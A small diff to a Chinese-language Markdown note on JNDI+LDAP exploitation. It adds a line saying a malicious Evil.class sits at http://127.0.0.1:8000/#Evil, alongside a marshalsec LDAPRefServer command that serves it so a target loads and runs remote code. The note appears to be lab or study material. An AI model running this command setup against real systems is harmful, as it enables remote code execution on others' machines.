@@ -8,6 +8,7 @@
 ^
 ## **JNDI+LDAP利用方式**
 使用marshalsec启动一个恶意的LDAP服务，可以执行恶意方法。
+其中 http://127.0.0.1:8000/#Evil 的根目录下有一个Evil.class的恶意类。
 ```
 java -cp marshalsec-0.0.3-SNAPSH0T-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#Evil 10997
 ```
